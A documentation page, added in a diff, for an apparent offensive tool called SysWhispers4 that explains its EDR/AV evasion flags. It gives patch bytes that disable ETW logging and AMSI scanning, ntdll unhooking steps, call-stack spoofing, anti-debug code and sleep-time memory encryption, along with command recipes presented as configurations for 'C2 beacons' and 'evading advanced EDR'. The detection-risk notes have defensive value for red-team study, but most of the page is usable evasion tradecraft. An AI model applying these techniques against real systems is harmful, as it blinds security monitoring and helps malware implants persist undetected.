@@ -1,0 +1,914 @@
+---
+title: 'Evasion Options'
+description: 'Comprehensive guide to all evasion flags and their effects'
+icon: 'shield'
+---
+
+## Overview
+
+SysWhispers4 provides multiple evasion flags that generate additional defensive and anti-analysis capabilities. These options go beyond syscall invocation and SSN resolution to provide comprehensive EDR/AV evasion.
+
+All evasion options are **boolean flags** (no arguments) that can be combined for layered defense.
+
+## Quick Reference
+
+| Flag | Generated Function | Purpose | EDR Detection Risk |
+|------|-------------------|---------|--------------------|
+| `--obfuscate` | N/A | Code obfuscation | ⭐ Low |
+| `--encrypt-ssn` | N/A | Encrypt SSN table | ⭐ Low |
+| `--stack-spoof` | Helper functions | Fake call stack frames | ⭐⭐ Medium |
+| `--etw-bypass` | `SW4PatchEtw()` | Disable ETW logging | ⚠️ High |
+| `--amsi-bypass` | `SW4PatchAmsi()` | Bypass AMSI scanning | ⚠️ High |
+| `--unhook-ntdll` | `SW4UnhookNtdll()` | Remove userland hooks | ⚠️ High |
+| `--anti-debug` | `SW4AntiDebugCheck()` | Detect debuggers | ⭐ Low |
+| `--sleep-encrypt` | `SW4SleepEncrypt()` | Memory encryption during sleep | ⭐⭐ Medium |
+
+---
+
+## `--obfuscate`
+
+### Description
+
+Randomizes stub ordering and injects junk instructions to make static analysis and signature detection more difficult.
+
+### Effects
+
+1. **Stub Randomization** - Syscall stubs are generated in random order instead of alphabetical
+2. **Junk Instructions** - Random NOPs, arithmetic operations, and stack adjustments inserted between real instructions
+3. **Varied Patterns** - Each generation produces different opcode sequences
+
+### Usage
+
+```bash
+python syswhispers.py --preset common --obfuscate
+```
+
+### Generated Code Comparison
+
+**Without obfuscation:**
+```asm
+SW4_NtAllocateVirtualMemory PROC
+    mov r10, rcx
+    mov eax, 18h
+    syscall
+    ret
+SW4_NtAllocateVirtualMemory ENDP
+```
+
+**With obfuscation:**
+```asm
+SW4_NtAllocateVirtualMemory PROC
+    nop
+    mov r10, rcx
+    xor r11, r11        ; Junk instruction
+    mov eax, 18h
+    inc r11             ; Junk instruction
+    dec r11             ; Junk instruction
+    syscall
+    ret
+SW4_NtAllocateVirtualMemory ENDP
+```
+
+### Advantages
+
+✅ **Breaks static signatures** - Different byte patterns each generation  
+✅ **Low overhead** - Junk instructions are fast NOPs and arithmetic  
+✅ **Low detection risk** - Obfuscation is common in legitimate software  
+✅ **Stacks with other options** - Works with all invocation/resolution methods
+
+### When to Use
+
+- You want to evade signature-based detection
+- You're concerned about static binary analysis
+- You want defense-in-depth
+- **Recommended for all stealth configurations**
+
+### Example
+
+```bash
+python syswhispers.py --preset stealth \
+  --method randomized \
+  --resolve recycled \
+  --obfuscate
+```
+
+---
+
+## `--encrypt-ssn`
+
+### Description
+
+XOR-encrypts the System Service Numbers (SSNs) at rest in the binary. SSNs are only decrypted at runtime when needed.
+
+### How It Works
+
+1. At generation time, a random XOR key is embedded in the code
+2. All SSN values are XOR-encrypted with this key
+3. At runtime, `SW4Initialize()` decrypts SSNs before use:
+   ```c
+   decrypted_ssn = encrypted_ssn ^ xor_key
+   ```
+
+### Usage
+
+```bash
+python syswhispers.py --preset common --encrypt-ssn
+```
+
+### Generated Code
+
+```c
+// Generation time
+#define XOR_KEY 0x5A5A5A5A  // Random key
+
+// SSNs stored encrypted
+static DWORD g_SsnTable[] = {
+    0x18 ^ XOR_KEY,  // NtAllocateVirtualMemory (encrypted)
+    0x55 ^ XOR_KEY,  // NtCreateThreadEx (encrypted)
+    // ...
+};
+
+// Runtime decryption
+void SW4Initialize() {
+    for (int i = 0; i < SSN_COUNT; i++) {
+        g_SsnTable[i] ^= XOR_KEY;  // Decrypt
+    }
+}
+```
+
+### Advantages
+
+✅ **SSNs hidden at rest** - Binary doesn't contain plaintext SSNs  
+✅ **Evades static scanning** - AV can't extract SSNs without running code  
+✅ **Minimal overhead** - XOR is very fast  
+✅ **Random key** - Each generation uses different key
+
+### Disadvantages
+
+⚠️ **Requires initialization** - Must call `SW4Initialize()` before syscalls  
+⚠️ **Memory contains plaintext** - After decryption, SSNs are in memory
+
+### When to Use
+
+- You're evading static binary analysis
+- You want to hide SSNs from signature scanners
+- You're okay with runtime initialization
+
+### Example
+
+```bash
+python syswhispers.py --preset injection \
+  --resolve freshycalls \
+  --encrypt-ssn
+```
+
+---
+
+## `--stack-spoof`
+
+### Description
+
+Includes helper functions to create synthetic call stack frames, reducing anomalies that EDRs might detect.
+
+### How It Works
+
+EDRs analyze call stacks for suspicious patterns. `--stack-spoof` generates functions that manipulate the stack to create "normal-looking" return addresses.
+
+### Usage
+
+```bash
+python syswhispers.py --preset common --stack-spoof
+```
+
+### Generated Functions
+
+```c
+// Helper to push fake return address
+PVOID SW4_PushFakeFrame(PVOID fakeReturnAddr);
+
+// Helper to pop fake frame
+void SW4_PopFakeFrame(PVOID savedFrame);
+```
+
+### Example Usage
+
+```c
+#include "SW4Syscalls.h"
+
+int main() {
+    SW4Initialize();
+    
+    // Push a fake return address (e.g., kernel32.dll address)
+    PVOID fakeFrame = SW4_PushFakeFrame(GetProcAddress(kernel32, "CreateFileW"));
+    
+    // Now make syscalls - stack looks more "normal"
+    SW4_NtAllocateVirtualMemory(...);
+    
+    // Clean up
+    SW4_PopFakeFrame(fakeFrame);
+}
+```
+
+### Call Stack Comparison
+
+**Without stack spoofing:**
+```
+[ntoskrnl.exe] NtAllocateVirtualMemory
+[Your.exe] SW4_NtAllocateVirtualMemory  <-- Suspicious!
+[Your.exe] main
+[kernel32.dll] BaseThreadInitThunk
+```
+
+**With stack spoofing:**
+```
+[ntoskrnl.exe] NtAllocateVirtualMemory
+[ntdll.dll] NtAllocateVirtualMemory     <-- Looks normal
+[kernel32.dll] CreateFileW              <-- Fake frame
+[Your.exe] main
+[kernel32.dll] BaseThreadInitThunk
+```
+
+### Advantages
+
+✅ **Reduces call stack anomalies** - Makes stack traces look more legitimate  
+✅ **Configurable** - You choose fake return addresses  
+✅ **Works with all invocation methods** - Complements indirect/randomized
+
+### Disadvantages
+
+⚠️ **Manual usage required** - You must call helper functions in your code  
+⚠️ **Complex** - Requires understanding of stack frames  
+⚠️ **Still detectable** - Advanced EDRs may see through simple spoofing
+
+### When to Use
+
+- You're evading EDRs with call stack profiling
+- You want to blend in with normal execution
+- You're willing to add helper function calls
+
+### Example
+
+```bash
+python syswhispers.py --preset stealth \
+  --method randomized \
+  --stack-spoof
+```
+
+---
+
+## `--etw-bypass`
+
+### Description
+
+Generates the `SW4PatchEtw()` function that patches **Event Tracing for Windows (ETW)** user-mode event writer to disable telemetry logging.
+
+<Warning>
+**For authorized testing only.** ETW bypass modifies system components and may trigger alerts.
+</Warning>
+
+### How It Works
+
+ETW is used by Windows and EDRs to log events (e.g., process creation, module loads). `SW4PatchEtw()` patches `EtwEventWrite()` in `ntdll.dll` to return immediately without logging:
+
+```c
+// Patch EtwEventWrite to:
+EtwEventWrite:
+    xor eax, eax    ; Return 0 (success)
+    ret             ; Do nothing
+```
+
+### Usage
+
+```bash
+python syswhispers.py --preset stealth --etw-bypass
+```
+
+### Generated Function
+
+```c
+// Patch ETW to disable logging
+BOOL SW4PatchEtw();
+```
+
+### Example Usage
+
+```c
+#include "SW4Syscalls.h"
+
+int main() {
+    SW4Initialize();
+    
+    // Disable ETW logging
+    if (!SW4PatchEtw()) {
+        printf("Failed to patch ETW\n");
+        return 1;
+    }
+    
+    // Now your actions won't be logged via ETW
+    SW4_NtCreateThreadEx(...);
+}
+```
+
+### Advantages
+
+✅ **Disables telemetry** - EDRs lose visibility into your actions  
+✅ **User-mode only** - No kernel driver required  
+✅ **Effective** - Many EDRs rely on ETW
+
+### Disadvantages
+
+❌ **Highly suspicious** - Patching ntdll is a red flag  
+❌ **May be detected** - EDRs monitor for ntdll modifications  
+❌ **Requires write access** - Must change memory protection on ntdll
+
+### When to Use
+
+- You're in a controlled test environment
+- You know the EDR relies on ETW
+- You're layering multiple evasion techniques
+- **Use with caution** - High detection risk
+
+### Detection Risk
+
+EDRs can detect ETW patching by:
+1. Monitoring `VirtualProtect()` calls on ntdll
+2. Calculating checksums of ntdll functions
+3. Detecting when ETW stops reporting events
+
+### Example
+
+```bash
+python syswhispers.py --preset stealth \
+  --method randomized \
+  --resolve from_disk \
+  --etw-bypass \
+  --unhook-ntdll
+```
+
+---
+
+## `--amsi-bypass`
+
+### Description
+
+Generates the `SW4PatchAmsi()` function that patches **Antimalware Scan Interface (AMSI)** to bypass script and memory scanning.
+
+<Warning>
+**For authorized testing only.** AMSI bypass modifies system components.
+</Warning>
+
+### How It Works
+
+AMSI is used by Windows Defender and other AVs to scan scripts (PowerShell, JScript) and memory. `SW4PatchAmsi()` patches `AmsiScanBuffer()` in `amsi.dll` to always return "clean":
+
+```c
+// Patch AmsiScanBuffer to:
+AmsiScanBuffer:
+    mov eax, 0x80070057    ; E_INVALIDARG (scan failed)
+    ret
+```
+
+### Usage
+
+```bash
+python syswhispers.py --preset stealth --amsi-bypass
+```
+
+### Generated Function
+
+```c
+// Patch AMSI to bypass scanning
+BOOL SW4PatchAmsi();
+```
+
+### Example Usage
+
+```c
+#include "SW4Syscalls.h"
+
+int main() {
+    SW4Initialize();
+    
+    // Bypass AMSI scanning
+    if (!SW4PatchAmsi()) {
+        printf("Failed to patch AMSI\n");
+        return 1;
+    }
+    
+    // Now AMSI won't detect your payloads
+    // (e.g., shellcode, PowerShell scripts)
+}
+```
+
+### Advantages
+
+✅ **Bypasses AV scanning** - Windows Defender won't scan your memory/scripts  
+✅ **Effective** - Widely used technique  
+✅ **User-mode only** - No kernel access required
+
+### Disadvantages
+
+❌ **Well-known technique** - EDRs specifically monitor AMSI patching  
+❌ **May be detected** - Modifying amsi.dll is a red flag  
+❌ **Requires amsi.dll loaded** - Target process must have AMSI initialized
+
+### When to Use
+
+- You're executing PowerShell or .NET payloads
+- You need to bypass Windows Defender memory scanning
+- You're in a test environment
+- **Use with caution** - Well-known technique
+
+### Detection Risk
+
+EDRs can detect AMSI bypass by:
+1. Monitoring modifications to `amsi.dll`
+2. Checksumming `AmsiScanBuffer()`
+3. Hooking `VirtualProtect()` calls on `amsi.dll`
+
+### Example
+
+```bash
+python syswhispers.py --preset stealth \
+  --method indirect \
+  --amsi-bypass \
+  --etw-bypass
+```
+
+---
+
+## `--unhook-ntdll`
+
+### Description
+
+Generates the `SW4UnhookNtdll()` function that removes userland hooks from `ntdll.dll` by remapping a clean copy from `\KnownDlls` or disk.
+
+<Warning>
+**For authorized testing only.** Unhooking ntdll may trigger EDR alerts.
+</Warning>
+
+### How It Works
+
+1. Load a clean copy of `ntdll.dll` from `\KnownDlls\ntdll.dll` or `C:\Windows\System32\ntdll.dll`
+2. Copy the clean `.text` section over the hooked ntdll in memory
+3. Flush instruction cache
+4. All hooks are removed
+
+### Usage
+
+```bash
+python syswhispers.py --preset stealth --unhook-ntdll
+```
+
+### Generated Function
+
+```c
+// Remove userland hooks from ntdll
+BOOL SW4UnhookNtdll();
+```
+
+### Example Usage
+
+```c
+#include "SW4Syscalls.h"
+
+int main() {
+    // IMPORTANT: Unhook BEFORE initializing syscalls
+    if (!SW4UnhookNtdll()) {
+        printf("Failed to unhook ntdll\n");
+        return 1;
+    }
+    
+    // Now initialize with clean ntdll
+    SW4Initialize();
+    
+    // Syscalls now bypass EDR hooks
+    SW4_NtAllocateVirtualMemory(...);
+}
+```
+
+<Note>
+**Call `SW4UnhookNtdll()` BEFORE `SW4Initialize()`** for best results. This ensures SSN resolution uses clean ntdll.
+</Note>
+
+### Advantages
+
+✅✅ **Removes ALL userland hooks** - EDR hooks are completely bypassed  
+✅ **Very effective** - Works against most EDRs  
+✅ **Clean ntdll** - Guaranteed correct function stubs
+
+### Disadvantages
+
+❌ **Highly suspicious** - Remapping ntdll is a major red flag  
+❌ **EDR may detect** - Many EDRs monitor ntdll integrity  
+❌ **Requires memory operations** - `NtMapViewOfSection`, `VirtualProtect`  
+❌ **Complex** - Involves PE parsing and memory mapping
+
+### When to Use
+
+- You're in a heavily hooked environment
+- You need to bypass EDR hooks completely
+- You're combining with other evasion techniques
+- **High risk, high reward**
+
+### Detection Risk
+
+EDRs can detect unhooking by:
+1. Monitoring `NtMapViewOfSection()` calls for ntdll
+2. Calculating checksums of ntdll sections
+3. Detecting when hooks stop working
+4. Memory integrity checks
+
+### Example
+
+```bash
+python syswhispers.py --preset stealth \
+  --method randomized \
+  --resolve from_disk \
+  --unhook-ntdll \
+  --etw-bypass
+```
+
+---
+
+## `--anti-debug`
+
+### Description
+
+Generates the `SW4AntiDebugCheck()` function that detects debuggers using multiple techniques: PEB checks, timing analysis, heap flags, debug ports, and instrumentation callbacks.
+
+### How It Works
+
+The function performs several checks:
+
+1. **PEB.BeingDebugged** - Checks PEB flag
+2. **PEB.NtGlobalFlag** - Checks for debugger artifacts
+3. **Heap flags** - Checks heap for debugger presence
+4. **Debug port** - Queries `NtQueryInformationProcess` for debug port
+5. **Timing** - Measures execution time to detect stepping
+6. **Instrumentation callback** - Checks for debug callbacks
+
+### Usage
+
+```bash
+python syswhispers.py --preset common --anti-debug
+```
+
+### Generated Function
+
+```c
+// Returns TRUE if debugger detected
+BOOL SW4AntiDebugCheck();
+```
+
+### Example Usage
+
+```c
+#include "SW4Syscalls.h"
+
+int main() {
+    SW4Initialize();
+    
+    // Check for debugger
+    if (SW4AntiDebugCheck()) {
+        printf("Debugger detected! Exiting.\n");
+        return 1;
+    }
+    
+    // Safe to proceed
+    SW4_NtAllocateVirtualMemory(...);
+}
+```
+
+### Detection Methods
+
+```c
+BOOL SW4AntiDebugCheck() {
+    // 1. PEB.BeingDebugged
+    if (IsDebuggerPresent()) return TRUE;
+    
+    // 2. PEB.NtGlobalFlag
+    PPEB peb = (PPEB)__readgsqword(0x60);
+    if (peb->NtGlobalFlag & 0x70) return TRUE;
+    
+    // 3. Debug port via syscall
+    HANDLE debugPort = 0;
+    SW4_NtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, 
+                                   &debugPort, sizeof(debugPort), NULL);
+    if (debugPort) return TRUE;
+    
+    // 4. Timing check
+    LARGE_INTEGER start, end;
+    QueryPerformanceCounter(&start);
+    // ... do some work ...
+    QueryPerformanceCounter(&end);
+    if ((end.QuadPart - start.QuadPart) > THRESHOLD) return TRUE;
+    
+    // 5. Heap flags
+    // ... (checks heap for debugger artifacts)
+    
+    return FALSE;  // No debugger detected
+}
+```
+
+### Advantages
+
+✅ **Detects common debuggers** - x64dbg, WinDbg, OllyDbg, etc.  
+✅ **Multiple checks** - Harder to bypass all  
+✅ **Low overhead** - Fast checks  
+✅ **Low detection risk** - Anti-debug is common in legitimate software
+
+### Disadvantages
+
+⚠️ **Can be bypassed** - Advanced debuggers can hide from these checks  
+⚠️ **False positives** - May trigger in some legitimate environments
+
+### When to Use
+
+- You want to prevent analysis/reverse engineering
+- You're distributing to unknown environments
+- You want defense-in-depth
+- **Recommended for production malware simulation**
+
+### Example
+
+```bash
+python syswhispers.py --preset stealth \
+  --method randomized \
+  --anti-debug \
+  --obfuscate
+```
+
+---
+
+## `--sleep-encrypt`
+
+### Description
+
+Generates the `SW4SleepEncrypt(ms)` function that encrypts the process's `.text` section during sleep, then decrypts it upon waking (Ekko-style sleep obfuscation).
+
+### How It Works
+
+1. User calls `SW4SleepEncrypt(milliseconds)` instead of `Sleep()`
+2. Function:
+   - Encrypts the entire `.text` section (XOR with random key)
+   - Sleeps for the specified duration
+   - Decrypts the `.text` section
+   - Returns to caller
+3. During sleep, memory scanners see encrypted (garbage) bytes instead of code
+
+### Usage
+
+```bash
+python syswhispers.py --preset stealth --sleep-encrypt
+```
+
+### Generated Function
+
+```c
+// Sleep with memory encryption
+void SW4SleepEncrypt(DWORD milliseconds);
+```
+
+### Example Usage
+
+```c
+#include "SW4Syscalls.h"
+
+int main() {
+    SW4Initialize();
+    
+    // Allocate shellcode
+    PVOID pShellcode = NULL;
+    SW4_NtAllocateVirtualMemory(GetCurrentProcess(), &pShellcode, ...);
+    
+    // Sleep with encryption (instead of Sleep())
+    SW4SleepEncrypt(5000);  // Sleep 5 seconds with .text encrypted
+    
+    // Continue execution (memory is decrypted automatically)
+    SW4_NtCreateThreadEx(...);
+}
+```
+
+### Implementation
+
+```c
+void SW4SleepEncrypt(DWORD milliseconds) {
+    // Get .text section
+    PVOID pBase = GetModuleHandleA(NULL);
+    PIMAGE_SECTION_HEADER pText = FindSection(pBase, ".text");
+    
+    // Generate random key
+    BYTE key = (BYTE)(rand() & 0xFF);
+    
+    // Encrypt .text
+    DWORD oldProtect;
+    VirtualProtect(pText->VirtualAddress, pText->Misc.VirtualSize, 
+                   PAGE_READWRITE, &oldProtect);
+    for (SIZE_T i = 0; i < pText->Misc.VirtualSize; i++) {
+        ((BYTE*)pText->VirtualAddress)[i] ^= key;
+    }
+    
+    // Sleep while encrypted
+    Sleep(milliseconds);
+    
+    // Decrypt .text
+    for (SIZE_T i = 0; i < pText->Misc.VirtualSize; i++) {
+        ((BYTE*)pText->VirtualAddress)[i] ^= key;
+    }
+    VirtualProtect(pText->VirtualAddress, pText->Misc.VirtualSize, 
+                   oldProtect, &oldProtect);
+}
+```
+
+### Advantages
+
+✅ **Evades memory scanning** - Code is encrypted during sleep  
+✅ **Defeats periodic scans** - EDR scans see garbage bytes  
+✅ **Transparent** - Automatically decrypts on wake  
+✅ **Ekko technique** - Modern evasion method
+
+### Disadvantages
+
+⚠️ **Performance overhead** - Encryption/decryption takes time  
+⚠️ **Memory protection changes** - `VirtualProtect()` may trigger alerts  
+⚠️ **Detectable** - Pattern of encrypt-sleep-decrypt can be profiled
+
+### When to Use
+
+- You're sleeping between operations (e.g., C2 beacon)
+- You want to evade periodic memory scans
+- You're implementing sleep obfuscation
+- **Good for long-running implants**
+
+### Detection Risk
+
+EDRs can detect sleep encryption by:
+1. Monitoring `VirtualProtect()` patterns (RW → RX)
+2. Detecting timing of protection changes around `Sleep()`
+3. Memory snapshots before/after sleep
+
+### Example
+
+```bash
+python syswhispers.py --preset stealth \
+  --method randomized \
+  --sleep-encrypt \
+  --obfuscate
+```
+
+---
+
+## Combining Evasion Options
+
+### Compatibility Matrix
+
+All evasion options can be combined. Some work better together:
+
+| Combination | Effect | Recommended |
+|-------------|--------|-------------|
+| `--obfuscate` + `--encrypt-ssn` | Static + runtime obfuscation | ✅ |
+| `--unhook-ntdll` + `--resolve from_disk` | Complete hook bypass | ✅ |
+| `--etw-bypass` + `--amsi-bypass` | Disable telemetry + scanning | ✅ |
+| `--stack-spoof` + `--method randomized` | Maximum call stack evasion | ✅ |
+| `--anti-debug` + `--obfuscate` | Anti-analysis layered defense | ✅ |
+| `--sleep-encrypt` + beacon sleep | Perfect for C2 implants | ✅ |
+
+### Maximum Stealth Configuration
+
+```bash
+python syswhispers.py --preset stealth \
+  --method randomized \
+  --resolve recycled \
+  --obfuscate \
+  --encrypt-ssn \
+  --stack-spoof \
+  --etw-bypass \
+  --amsi-bypass \
+  --unhook-ntdll \
+  --anti-debug \
+  --sleep-encrypt
+```
+
+### Recommended Configurations by Scenario
+
+**Red Team Engagement:**
+```bash
+python syswhispers.py --preset injection \
+  --method indirect \
+  --resolve freshycalls \
+  --obfuscate \
+  --anti-debug
+```
+
+**Evading Advanced EDR:**
+```bash
+python syswhispers.py --preset stealth \
+  --method randomized \
+  --resolve recycled \
+  --unhook-ntdll \
+  --obfuscate \
+  --encrypt-ssn
+```
+
+**C2 Beacon:**
+```bash
+python syswhispers.py --preset evasion \
+  --method randomized \
+  --sleep-encrypt \
+  --etw-bypass \
+  --anti-debug
+```
+
+**Research/Testing:**
+```bash
+python syswhispers.py --preset all \
+  --method egg \
+  --resolve hw_breakpoint \
+  --obfuscate \
+  --encrypt-ssn
+```
+
+---
+
+## Runtime Initialization Order
+
+When using multiple evasion options, **initialization order matters**:
+
+```c
+int main() {
+    // 1. Unhook ntdll FIRST (before anything reads ntdll)
+    if (!SW4UnhookNtdll()) return 1;
+    
+    // 2. Initialize syscalls (reads clean ntdll)
+    if (!SW4Initialize()) return 1;
+    
+    // OR: Hatch eggs (if using --method egg)
+    // if (!SW4HatchEggs()) return 1;
+    
+    // 3. Check for debugger
+    if (SW4AntiDebugCheck()) return 1;
+    
+    // 4. Patch telemetry (optional)
+    SW4PatchEtw();
+    SW4PatchAmsi();
+    
+    // 5. Do your work
+    SW4_NtAllocateVirtualMemory(...);
+    
+    // 6. Sleep with encryption (when needed)
+    SW4SleepEncrypt(5000);
+    
+    return 0;
+}
+```
+
+<Warning>
+**Critical:** Always call `SW4UnhookNtdll()` **before** `SW4Initialize()` for best results.
+</Warning>
+
+---
+
+## Detection Risk Summary
+
+### Low Risk (Recommended for Production)
+
+- `--obfuscate` - Common obfuscation technique
+- `--encrypt-ssn` - Encrypted data at rest
+- `--anti-debug` - Legitimate software uses this
+
+### Medium Risk (Use with Caution)
+
+- `--stack-spoof` - Unusual but not alarming
+- `--sleep-encrypt` - Modern technique, less known
+
+### High Risk (Expect Detection)
+
+- `--etw-bypass` - Patching ntdll is a red flag
+- `--amsi-bypass` - Well-known technique, heavily monitored
+- `--unhook-ntdll` - Remapping ntdll is highly suspicious
+
+### Layered Defense
+
+Combine multiple options to make detection harder:
+
+```bash
+# EDR must detect ALL of these to stop you:
+python syswhispers.py --preset stealth \
+  --method randomized \
+  --resolve recycled \
+  --obfuscate \
+  --encrypt-ssn \
+  --stack-spoof \
+  --anti-debug
+```
+
+---
+
+## See Also
+
+- [Command Reference](/cli/command-reference) - All CLI flags
+- [SSN Resolution Methods](/cli/ssn-resolution-methods) - How SSNs are resolved
+- [Invocation Methods](/cli/invocation-methods) - How syscalls are executed
+- [Configuration Guide](/guides/basic-usage) - Choosing the right options
+- [Integration Guide](/guides/integration-msvc) - Using generated code in your project
